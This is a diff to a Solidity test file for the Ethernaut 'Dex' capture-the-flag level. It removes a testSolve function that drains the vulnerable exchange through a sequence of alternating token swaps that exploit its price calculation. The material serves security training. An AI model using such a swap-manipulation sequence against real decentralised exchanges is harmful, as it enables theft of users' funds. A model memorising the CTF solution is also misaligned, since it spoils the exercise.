@@ -49,24 +49,4 @@ contract TestDex is Test, Utils {
         vm.startPrank(player);
         assertFalse(submitLevelInstance(ethernaut, address(instance)));
     }
-
-    /// @notice Test the solution for the level.
-    function testSolve() public {
-        vm.startPrank(player);
-
-        SwappableToken token1 = SwappableToken(instance.token1());
-        SwappableToken token2 = SwappableToken(instance.token2());
-
-        token1.approve(address(instance), 200);
-        token2.approve(address(instance), 200);
-        instance.swap(address(token1), address(token2), 10);
-
-        instance.swap(address(token2), address(token1), 20);
-        instance.swap(address(token1), address(token2), 24);
-        instance.swap(address(token2), address(token1), 30);
-        instance.swap(address(token1), address(token2), 41);
-        instance.swap(address(token2), address(token1), 45);
-
-        assertTrue(submitLevelInstance(ethernaut, address(instance)));
-    }
 }
